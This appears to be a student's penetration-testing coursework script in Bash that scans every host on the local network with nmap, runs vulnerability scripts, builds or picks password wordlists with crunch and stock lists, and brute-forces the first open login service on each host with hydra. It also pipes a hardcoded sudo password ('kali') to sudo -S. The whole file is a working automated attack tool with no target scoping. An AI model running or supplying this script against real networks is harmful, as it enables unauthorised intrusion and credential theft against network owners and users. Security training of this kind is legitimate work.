#!/bin/bash
# Kweh Jing Xiang, S18, CFC3110, Lecturer: Kar Wei

#This Function check if all necessary packages are installed to be used later on.
function PRECHECKER()
{
	#nmap is used to scan for open ports of target IP address
	#It can also be used to scan for endpoints that are connected to the LAN
	function installnmap()
	{
	if command -v nmap >/dev/null
	then 
		echo '[+] nmap is installed'
		return
	else
		echo '[-] nmap NOT installed, installing...'
		echo kali | sudo -S apt-get install nmap -y 2>/dev/null
	fi
	installnmap
	}
	installnmap

}
PRECHECKER

##Network Mapping of Local Area Network (LAN)
localip=$(hostname -I) #storing own machine IP as variable
lhostmask=$(ip address | grep $(hostname -I) | awk '{print $2}') #storing ip addreass & network mask as variable
networkrange=$(netmask -r $lhostmask | awk '{print $1}') #store resolved network range as variable
networkrangetotal=$(netmask -r $lhostmask | awk '{print $2}') #store calculated IP addresses available, as variable
gateip=$(route -n | grep UG | awk '{print $2}') #store gateway/router IP as variable
nmap -sn $lhostmask | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'| grep -v $localip | grep -v $gateip > temp_onlinehost
onlinehost=$(cat temp_onlinehost) 
#Display Network details of Local Area Network
echo -e "\n==================== Network Information ====================" 
echo "Local Network range          : 	$networkrange"
echo "Total IP addresses in Network:	$networkrangetotal" 
echo -e "\nTotal host online: \n$onlinehost"


##Service Enumeration
echo -e "\n==================== Enumeration ====================" 
for eachip in $(cat temp_onlinehost);
do
	#Enumerating each ip address and saving into file
	echo -e "\nEnumerating $eachip in process.."
	echo -e "\n==================================================
------------ Services Enumeration ----------------
==================================================" > services_$eachip
	#For nmap, -sV checks for services, -Pn treats all host as online to prevent target device from blocking scan
	#-O checks for the Operating System
	echo "kali" | sudo -S nmap -sV -Pn -O $eachip 2>/dev/null >> services_$eachip
	echo "Services Enumeration saved into services_$eachip"
	
	#Scanning for potential vulnerabilities and saving into file	
	echo -e "\nScanning $eachip for Potential Vulnerabilites in process.."
	echo -e "\n==================================================
----------Potential Vulnerabilities --------------
==================================================" >> services_$eachip
	nmap -sV --script vuln $eachip >> services_$eachip
	echo "Potential Vulnerabilities saved into services_$eachip"
done


####WEAK PASSWORD!!!

##choosing user list
echo "/usr/share/nmap/nselib/data/usernames.lst
/usr/share/metasploit-framework/data/wordlists/unix_users.txt" > temp_userlist
echo -e "\n============================ Choose User List =============================================="
echo -e "\nWhich user list do you want to use? choose number."
echo -e "\n<1> /usr/share/nmap/nselib/data/usernames.lst (10 users)
<2> /usr/share/metasploit-framework/data/wordlists/unix_users.txt (168 users) "
read userlst
echo "you have chosen $(cat temp_userlist | awk NR==$userlst)"

##choosing/creating passwordl list
echo "/usr/share/john/password.lst 
/usr/share/nmap/nselib/data/passwords.lst
/usr/share/metasploit-framework/data/wordlists/password.lst
Create own password list" > temp_pwdlist
echo -e "\n========================== Choose Password List ============================================"
echo -e "Which password list do you want to use? choose number. 
(each password list is ranked in decreasing order from top most common to least most common)"
echo -e "\n<1> /usr/share/john/password.lst (3558 passwords)
<2> /usr/share/nmap/nselib/data/passwords.lst (5007 passwords)
<3> /usr/share/metasploit-framework/data/wordlists/password.lst (88397 passwords)
<4> Create own password list"
read pwdlst
if [[ "$pwdlst" =~ [[:digit:]] && "$pwdlst" -gt 0 && "$pwdlst" -lt 4 ]];
then
	echo "You have chosen $(cat temp_pwdlist | awk NR==$pwdlst)"
	echo -e "\nDo you want to use the top N-th most popular password from your chosen list? (y/n)"
	read pwdshort
	if [ $pwdshort == "y" ]
		then 
		echo "enter a number."
		read toppwd
		grep -v '#!' $(cat temp_pwdlist | awk NR==$pwdlst) | head -n $toppwd > custompwd.lst
		echo "Your Favorite Password list is stored in custompwd.lst"
		else 
		echo "Original Password list will be used."
		cat $(cat temp_pwdlist | awk NR==$pwdlst) > custompwd.lst
	fi
elif [ $pwdlst == 4 ]
then
	echo "you have chosen to Create own Password List"
	echo "what is the minimum character requirement?"
	read min
	echo "what is the maximum character requirement?"
	read max
	echo "do you want to mix of alphabet and numbers and symbols? (y/n)"
	read alnum
	if [ $alnum == "y" ]
	then
	crunch $min $max -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space -o custompwd.lst
	echo "Your Favorite Password list is stored in custompwd.lst"
	else
	crunch $min $max -o custompwd.lst
	echo "Your Favorite Password list is stored in custompwd.lst"
	fi
fi

#Checking for available login services
echo -e "\n================================ Login Availability ========================================"
for eachip in $(cat temp_onlinehost);
do
	if [[ $(cat services_$eachip | grep open | grep "21\|ftp\|22\|ssh\|23\|telnet\|25\|smtp\|80\|http\|smb\|ldap\|3306\|mysql\|5432\|postgre") ]]
	then echo -e "[+] Login service available for $eachip !!"
	onlinesvc1=$(cat services_$eachip | grep open | grep "21\|ftp\|22\|ssh\|23\|telnet\|25\|smtp\|80\|http\|smb\|ldap\|3306\|mysql\|5432\|postgre" | head -n 1)
	protocol=$(echo $onlinesvc1 | awk '{print $3}')
	portnum=$(echo $onlinesvc1 | awk '{print $1}' | awk -F/ '{print $1}')
	echo -n "Services: $protocol "
	echo -e "Port Number: $portnum\n"
	echo -e "\n==================================================
-------- Discovered Users & Password -------------
==================================================" >> services_$eachip
	else echo "[-]NO login service available for $eachip"
	echo -e "\n==================================================
-------- Discovered Users & Password -------------
==================================================" >> services_$eachip	
	echo "[-]NO login service available for $eachip" >> services_$eachip
	fi
done

#Brute Forcing Service 
for eachip in $(cat temp_onlinehost);
do
	if [[ $(cat services_$eachip | grep open | grep "21\|ftp\|22\|ssh\|23\|telnet\|25\|smtp\|80\|http\|smb\|ldap\|3306\|mysql\|5432\|postgre") ]]
	then 
	#onlinesvc1 ; "head -n 1" will brute force the only first available login service
	onlinesvc1=$(cat services_$eachip | grep open | grep "21\|ftp\|22\|ssh\|23\|telnet\|25\|smtp\|80\|http\|smb\|ldap\|3306\|mysql\|5432\|postgre" | head -n 1)
	protocol=$(echo $onlinesvc1 | awk '{print $3}')
	portnum=$(echo $onlinesvc1 | awk '{print $1}' | awk -F/ '{print $1}')
	echo -e "\n============================= Brute Force =================================================="
	echo "Proceeding to brute-force the first service available for $eachip"
	#hydra is the brute force tool used, 
	#-e nsr additional checks, "n" for null password, "s" try login as pass, "r" try the reverse login as pass
	#-u by default Hydra checks all passwords for one login and then tries the next login. This option loops around the passwords, so the first password is tried on all logins, then the next password.
	hydra -e nsr -u -L $(cat temp_userlist | awk NR==$userlst) -P custompwd.lst $eachip $protocol -s $portnum >> services_$eachip
	echo "Brute force for $eachip completed"
	fi
done

function VIEWREPORT()
{	
	echo -e "\n============================= View Report =================================================="
	echo -e "\nWhich IP address information do you want to view? choose number or c to compile report"
	cat -n temp_onlinehost
	echo "     c Compile all IP addresses information into 1 report and view"
	echo "     x Exit (Make sure you compile report before exiting)"
	read reportip
	if [[ "$reportip" =~ [[:digit:]] && "$reportip" -gt 0 ]]
		then
		echo $(cat temp_onlinehost | awk NR==$reportip)
		geany services_$(cat temp_onlinehost | awk NR==$reportip) &
		
		elif [[ "$reportip" == "c" ]]
		then
		cat services_* > compiled_report.txt
		geany compiled_report.txt &

		elif [[ "$reportip" == "x" ]]
		then
		cat services_* > compiled_report.txt
		exit
	
	fi
VIEWREPORT
}
VIEWREPORT

